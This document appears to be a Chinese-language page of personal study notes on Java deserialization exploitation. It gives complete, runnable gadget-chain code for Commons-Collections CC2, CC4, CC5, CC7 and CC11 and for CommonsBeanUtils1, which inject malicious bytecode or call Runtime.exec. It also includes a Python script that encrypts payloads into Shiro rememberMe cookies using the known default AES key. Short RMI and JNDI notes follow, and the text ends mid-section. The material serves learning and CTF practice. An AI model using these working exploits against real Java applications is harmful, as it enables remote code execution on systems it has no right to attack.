<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">完美解决</span><br><span class="line"></span><br><span class="line">### 法二</span><br><span class="line"></span><br><span class="line">欠着</span><br><span class="line"></span><br><span class="line"># CC4链子</span><br><span class="line"></span><br><span class="line">## 原理</span><br><span class="line"></span><br><span class="line">PriorityQueue类的heapify方法，追踪进去-&gt;siftDown-&gt;siftDownUsingComparator,调用compare方法</span><br><span class="line"></span><br><span class="line">## 结构</span><br><span class="line"></span><br><span class="line">### 初始</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();
    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());

    //    templates.newTransformer();
    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,
            new Object[]&#123;templates&#125;);
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
            instantiateTransformer
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    serialize(priorityQueue);

    //unserialize(&quot;ser.bin&quot;);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">初始板子没回应</span><br><span class="line"></span><br><span class="line">### 完整模板</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.collections4.Transformer;<br>import org.apache.commons.collections4.comparators.TransformingComparator;<br>import org.apache.commons.collections4.functors.ChainedTransformer;<br>import org.apache.commons.collections4.functors.ConstantTransformer;<br>import org.apache.commons.collections4.functors.InstantiateTransformer;</p>
<p>import javax.xml.transform.Templates;<br>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.PriorityQueue;<br>&#x2F;&#x2F;F:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;target&#x2F;classes&#x2F;org&#x2F;example&#x2F;call.class</p>
<p>public class Main{<br>    public static void main(String[] args) throws Exception{<br>        TemplatesImpl templates &#x3D; new TemplatesImpl();<br>        Class templatesClass &#x3D; templates.getClass();<br>        Field nameField &#x3D; templatesClass.getDeclaredField(“_name”);<br>        nameField.setAccessible(true);<br>        nameField.set(templates,”Drunkbaby”);</p>
<pre><code>    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;E://Calc.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
    tfactoryField.setAccessible(true);
    tfactoryField.set(templates, new TransformerFactoryImpl());
    //    templates.newTransformer();
    InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,
            new Object[]&#123;templates&#125;);
    Transformer[] transformers = new Transformer[]&#123;
            new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
            instantiateTransformer
    &#125;;
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    //  instantiateTransformer.transform(TrAXFilter.class);

    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    priorityQueue.add(1);
    priorityQueue.add(2);
    serialize(priorityQueue);
    unserialize(&quot;ser.bin&quot;);
&#125;
public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 解决bug</span><br><span class="line"></span><br><span class="line">先让 `transformingComparator` 的值成为一个无关的对象，在 add 完之后再用反射修改。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> Class c &#x3D; transformingComparator.getClass();<br> Field transformingField &#x3D; c.getDeclaredField(“transformer”);<br> transformingField.setAccessible(true);<br> transformingField.set(transformingComparator, chainedTransformer);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;  
    TemplatesImpl templates = new TemplatesImpl();  
</code></pre>
<p> Class templatesClass &#x3D; templates.getClass();<br> Field nameField &#x3D; templatesClass.getDeclaredField(“_name”);<br> nameField.setAccessible(true);<br> nameField.set(templates,”Drunkbaby”);  </p>
<p> Field bytecodesField &#x3D; templatesClass.getDeclaredField(“_bytecodes”);<br> bytecodesField.setAccessible(true);<br> byte[] evil &#x3D; Files.readAllBytes(Paths.get(“E:&#x2F;&#x2F;Calc.class”));<br> byte[][] codes &#x3D; {evil};<br> bytecodesField.set(templates,codes);  </p>
<p>&#x2F;&#x2F;        Field tfactoryField &#x3D; templatesClass.getDeclaredField(“_tfactory”);<br>&#x2F;&#x2F;        tfactoryField.setAccessible(true);<br>&#x2F;&#x2F;        tfactoryField.set(templates, new TransformerFactoryImpl());<br>&#x2F;&#x2F;        templates.newTransformer();<br> InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]{Templates.class},<br> new Object[]{templates});<br> Transformer[] transformers &#x3D; new Transformer[]{<br>                new ConstantTransformer(TrAXFilter.class), &#x2F;&#x2F; 构造 setValue 的可控参数<br> instantiateTransformer<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br> &#x2F;&#x2F;  instantiateTransformer.transform(TrAXFilter.class);  </p>
<p> TransformingComparator transformingComparator &#x3D; new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));<br> PriorityQueue priorityQueue &#x3D; new PriorityQueue&lt;&gt;(transformingComparator);<br> priorityQueue.add(1);<br> priorityQueue.add(2);  </p>
<p> Class c &#x3D; transformingComparator.getClass();<br> Field transformingField &#x3D; c.getDeclaredField(“transformer”);<br> transformingField.setAccessible(true);<br> transformingField.set(transformingComparator, chainedTransformer);  </p>
<p> serialize(priorityQueue);<br> unserialize(“ser.bin”);<br> }<br>    public static void serialize(Object obj) throws IOException {<br>        ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(“ser.bin”));<br> oos.writeObject(obj);<br> }<br>    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{<br>        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(Filename));<br> Object obj &#x3D; ois.readObject();<br> return obj;<br> }  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC2链子</span><br><span class="line"></span><br><span class="line">就是把CC4的InstantiateTransformer换成了 InvokerTransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;
    TemplatesImpl templates = new TemplatesImpl();
    Class templatesClass = templates.getClass();
    Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
    nameField.setAccessible(true);
    nameField.set(templates,&quot;Drunkbaby&quot;);

    Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
    bytecodesField.setAccessible(true);
    byte[] evil = Files.readAllBytes(Paths.get(&quot;F:/ctf-tool/ctf/t/lz/cc/c1/cc1/target/classes/org/example/call.class&quot;));
    byte[][] codes = &#123;evil&#125;;
    bytecodesField.set(templates,codes);

    InvokerTransformer invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
    TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));
    PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);
    priorityQueue.add(templates);
    priorityQueue.add(templates);

    Class c = transformingComparator.getClass();
    Field transformingField = c.getDeclaredField(&quot;transformer&quot;);
    transformingField.setAccessible(true);
    transformingField.set(transformingComparator, invokerTransformer);
    //serialize(priorityQueue);
    unserialize(&quot;ser3.bin&quot;);
&#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC5链子</span><br><span class="line"></span><br><span class="line">从 `BadAttributeValueExpException` 的 `readObject()` 方法进来。</span><br><span class="line"></span><br><span class="line">这里调用了 `toString()` 方法，然后 `TiedMapEntry` 这个类调用了 `toString()` 方法。</span><br><span class="line"></span><br><span class="line">`TiedMapEntry` 这个类的 `toString()` 方法调用了 `getValue()` 方法，在 `getValue()` 方法中，我们看到了 `get()` 方法被调用，这就和后续的 `LazyMap.get()` 对应起来了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>public static void main(String[] args) throws Exception&#123;  
    Transformer[] transformers = new Transformer[]&#123;  
            new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
</code></pre>
<p> new InvokerTransformer(“getMethod”,<br> new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br> new InvokerTransformer(“invoke”<br> , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br> new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”})<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(transformers);<br> HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();<br> Map decorateMap &#x3D; LazyMap.decorate(hashMap, chainedTransformer);<br> TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorateMap, “value”);  </p>
<p> BadAttributeValueExpException badAttributeValueExpException &#x3D; new BadAttributeValueExpException(null);<br> Class c &#x3D; Class.forName(“javax.management.BadAttributeValueExpException”);<br> Field field &#x3D; c.getDeclaredField(“val”);<br> field.setAccessible(true);<br> field.set(badAttributeValueExpException, tiedMapEntry);<br> serialize(badAttributeValueExpException);<br> unserialize(“ser.bin”);<br> } </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC7链子</span><br><span class="line"></span><br><span class="line">`Hashtable` 的入口类 `readObject()` 方法调用了一个 `reconstitutionPut()` 方法。</span><br><span class="line"></span><br><span class="line">继续 `reconstitutionPut()` 方法，跟进之后我们看到 `reconstitutionPut()` 方法调用了 `equals()` 方法，当然它也调用了 `hashCode()` 方法，如果是 `hashCode()` 这里走的话，又回到我们 CC6 的链子了，我们今天主看 CC7 的。</span><br><span class="line"></span><br><span class="line">接下来是 `equals()` 这个方法，因为要找的话实在是太多了，直接全局搜索，定位到 `AbstractMapDecorator` 这个类中。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>public static void main(String[] args) throws Exception {<br>        Transformer[] transformers &#x3D; new Transformer[]{<br>                new ConstantTransformer(Runtime.class), &#x2F;&#x2F; 构造 setValue 的可控参数<br> new InvokerTransformer(“getMethod”,<br> new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, null}),<br> new InvokerTransformer(“invoke”<br> , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),<br> new InvokerTransformer(“exec”, new Class[]{String.class}, new Object[]{“calc”})<br>        };<br> ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(new Transformer[]{});<br> HashMap&lt;Object, Object&gt; hashMap1 &#x3D; new HashMap&lt;&gt;();<br> HashMap&lt;Object, Object&gt; hashMap2 &#x3D; new HashMap&lt;&gt;();<br> Map decorateMap1 &#x3D; LazyMap.decorate(hashMap1, chainedTransformer);<br> decorateMap1.put(“yy”, 1);<br> Map decorateMap2 &#x3D; LazyMap.decorate(hashMap2, chainedTransformer);<br> decorateMap2.put(“zZ”, 1);<br> Hashtable hashtable &#x3D; new Hashtable();<br> hashtable.put(decorateMap1, 1);<br> hashtable.put(decorateMap2, 1);<br> Class c &#x3D; ChainedTransformer.class;<br> Field field &#x3D; c.getDeclaredField(“iTransformers”);<br> field.setAccessible(true);<br> field.set(chainedTransformer, transformers);<br> decorateMap2.remove(“yy”);  </p>
<p> serialize(hashtable);<br> unserialize(“ser.bin”);  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># CC11链子</span><br><span class="line"></span><br><span class="line">和前面的总结差不多，就是另拿出来一个好用的</span><br><span class="line"></span><br><span class="line">前半段lazyMap，后半段ConstantTransformer</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;</p>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.ChainedTransformer;<br>import org.apache.commons.collections.functors.ConstantTransformer;<br>import org.apache.commons.collections.functors.InvokerTransformer;<br>import org.apache.commons.collections.keyvalue.TiedMapEntry;<br>import org.apache.commons.collections.map.LazyMap;</p>
<p>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.HashMap;<br>import java.util.Map;</p>
<p>public class Main {</p>
<pre><code>public static void main(String[] args) throws Exception&#123;
    byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\JavaClass\\TemplatesBytes.class&quot;));
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;);
    setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);
    setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
    InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
</code></pre>
<p>&#x2F;&#x2F;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(invokerTransformer);<br>        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();<br>&#x2F;&#x2F;        Map lazyMap &#x3D; LazyMap.decorate(hashMap, chainedTransformer);<br>        Map lazyMap &#x3D; LazyMap.decorate(hashMap, new ConstantTransformer(“five”)); &#x2F;&#x2F; 防止在反序列化前弹计算器<br>        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(lazyMap, templates);<br>        HashMap&lt;Object, Object&gt; expMap &#x3D; new HashMap&lt;&gt;();<br>        expMap.put(tiedMapEntry, “value”);<br>        lazyMap.remove(templates);</p>
<pre><code>    // 在 put 之后通过反射修改值
    setFieldValue(lazyMap, &quot;factory&quot;, invokerTransformer);

    serialize(expMap);
    unserialize(&quot;ser.bin&quot;);
&#125;

public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
&#125;

public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># CB链子-CommonsBeanUtils1</span><br><span class="line"></span><br><span class="line">- 以 Utils 结尾，一般这都是一个工具类/集</span><br><span class="line"></span><br><span class="line"> JavaBean</span><br><span class="line"></span><br><span class="line">- 就是变量是private的，变量的set和get是public的</span><br><span class="line">- </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>package org.example;</p>
<p>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br>import org.apache.commons.beanutils.BeanComparator;<br>import org.apache.commons.beanutils.PropertyUtils;</p>
<p>import java.io.*;<br>import java.lang.reflect.Field;<br>import java.nio.file.Files;<br>import java.nio.file.Paths;<br>import java.util.PriorityQueue;</p>
<p>public class Main {<br>    public static void main(String[] args) throws Exception{<br>        byte[] code &#x3D; Files.readAllBytes(Paths.get(“F:&#x2F;ctf-tool&#x2F;ctf&#x2F;t&#x2F;lz&#x2F;cc&#x2F;c1&#x2F;cc1&#x2F;target&#x2F;classes&#x2F;org&#x2F;example&#x2F;call.class”));<br>        TemplatesImpl templates &#x3D; new TemplatesImpl();<br>        setFieldValue(templates, “_name”, “Calc”);<br>        setFieldValue(templates, “_bytecodes”, new byte[][] {code});<br>        setFieldValue(templates, “_tfactory”, new TransformerFactoryImpl());<br>        &#x2F;&#x2F;    templates.newTransformer();<br>        final BeanComparator beanComparator &#x3D; new BeanComparator();<br>        &#x2F;&#x2F; 创建新的队列，并添加恶意字节码<br>        final PriorityQueue<Object> queue &#x3D; new PriorityQueue<Object>(2, beanComparator);<br>        queue.add(1);<br>        queue.add(1);</p>
<pre><code>    // 将 property 的值赋为 outputProperties
    setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);
    setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);
    serialize(queue);
    unserialize(&quot;ser.bin&quot;);
&#125;

public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;
    Field field = obj.getClass().getDeclaredField(fieldName);
    field.setAccessible(true);
    field.set(obj, value);
&#125;

public static void serialize(Object obj) throws IOException &#123;
    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
    oos.writeObject(obj);
&#125;
public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;
    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
    Object obj = ois.readObject();
    return obj;
&#125;
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Shiro550</span><br><span class="line"></span><br><span class="line">https://www.npackd.org/p/org.apache.tomcat.Tomcat/8.5.81</span><br><span class="line"></span><br><span class="line">![image-20250210115533244](https://github.com/DDL08/images/blob/img/img/image-20250210115533244.png?raw=true)</span><br><span class="line"></span><br><span class="line">那个运行嘎嘎爆红没事，能用</span><br><span class="line"></span><br><span class="line">## 乱码问题解决</span><br><span class="line"></span><br><span class="line">![image-20250211222159112](https://github.com/DDL08/images/blob/img/img/image-20250211222159112.png?raw=true)</span><br><span class="line"></span><br><span class="line">![image-20250211222229788](https://github.com/DDL08/images/blob/img/img/image-20250211222229788.png?raw=true)</span><br><span class="line"></span><br><span class="line">## 思路</span><br><span class="line"></span><br><span class="line">1. 先是查找获取cookie的rememberMe的方法</span><br><span class="line"></span><br><span class="line">   - ```</span><br><span class="line">     getRememberedSerializedIdentity</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>他被类👇调用</p>
<ul>
<li><pre><code>getRememberedPrincipals
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 这个类在调用getRememberedSerializedIdentity之后有个</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    convertBytesToPrincipals</span><br></pre></td></tr></table></figure>

- 会进行解密操作（aes加密，跟进可查看）和反序列化操作
</code></pre>
</li>
</ul>
</li>
<li><p>加密过程在断点onsuccesslogin那个可以看到</p>
</li>
</ol>
<h2 id="aes加密脚本"><a href="#aes加密脚本" class="headerlink" title="aes加密脚本"></a>aes加密脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># －*-* coding:utf-8</span><br><span class="line"># @Time    :  2022/7/13 17:36</span><br><span class="line"># @Author  : Drunkbaby</span><br><span class="line"># @FileName: poc.py</span><br><span class="line"># @Software: VSCode</span><br><span class="line"># @Blog    ：https://drun1baby.github.io/</span><br><span class="line"></span><br><span class="line">from email.mime import base</span><br><span class="line">from pydoc import plain</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from turtle import mode</span><br><span class="line">import uuid</span><br><span class="line">from random import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_file_data(filename):</span><br><span class="line"> with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line"> data = f.read()</span><br><span class="line"> return data</span><br><span class="line"></span><br><span class="line">def aes_enc(data):</span><br><span class="line"> BS = AES.block_size</span><br><span class="line"> pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = uuid.uuid4().bytes</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line"> return ciphertext</span><br><span class="line"></span><br><span class="line">def aes_dec(enc_data):</span><br><span class="line"> enc_data = base64.b64decode(enc_data)</span><br><span class="line"> unpad = lambda s: s[:-s[-1]]</span><br><span class="line"> key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br><span class="line"> mode = AES.MODE_CBC</span><br><span class="line"> iv = enc_data[:16]</span><br><span class="line"> encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"> plaintext = encryptor.decrypt(enc_data[16:])</span><br><span class="line"> plaintext = unpad(plaintext)</span><br><span class="line"> return plaintext</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"> data = get_file_data(&quot;ser.bin&quot;)</span><br><span class="line"> print(aes_enc(data))</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h1 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h1><p>这个东西我觉得直接用利用工具吧，550和721就一个key变成动态生成的了</p>
<h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>全称 Remote Method Invocation（远程方法调用）</p>
<p>依赖的通信协议为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Server ———— 服务端：服务端通过绑定远程对象，这个对象可以封装很多网络操作，也就是 Socket</span><br><span class="line"></span><br><span class="line">Client ———— 客户端：客户端调用服务端的方法</span><br><span class="line"></span><br><span class="line">Registry ———— 注册端；提供服务注册与服务获取。即 Server 端向 Registry 注册服务，比如地址、端口等一些信息，Client 端从 Registry 获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</span><br></pre></td></tr></table></figure>

<ul>
<li>port远程服务这里如果传入的是 0，它会被发布到网络上的一个随机端口</li>
</ul>
<p>使用类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">RemoteObj remoteObj</span><br><span class="line">Registry registry</span><br><span class="line">客户端</span><br><span class="line">反着来</span><br></pre></td></tr></table></figure>



<h2 id="dispatch对应关系"><a href="#dispatch对应关系" class="headerlink" title="dispatch对应关系"></a>dispatch对应关系</h2><ul>
<li>0 —– bind</li>
<li>1 —– list</li>
<li>2 —– lookup</li>
<li>3 —– rebind</li>
<li>4 —– unbind</li>
</ul>
<h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1><p>特点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialContext</span><br><span class="line">Registry</span><br><span class="line">Reference</span><br></pre></td></tr></table></figure>

<p><strong>Java Naming and Directory Interface</strong></p>
<p>jndi 在 jdk 里面支持以下四种服务</p>
<ul>
<li>LDAP：轻量级目录访问协议</li>
<li>通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务</li>
<li>Java 远程方法调用(RMI) 注册表</li>
<li>DNS 服务</li>
</ul>
<p>导入的包其中最重要的是 <code>javax.naming</code> 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</p>
<h2 id="复现1"><a href="#复现1" class="headerlink" title="复现1"></a>复现1</h2><p>jndi的reference的引用+rmi的远程调用</p>
<p>这个漏洞在 jdk8u121 当中被修复，也就是 <code>lookup()</code> 方法只可以对本地进行 <code>lookup()</code> 方法的调用。</p>
<p>calc.java</p>
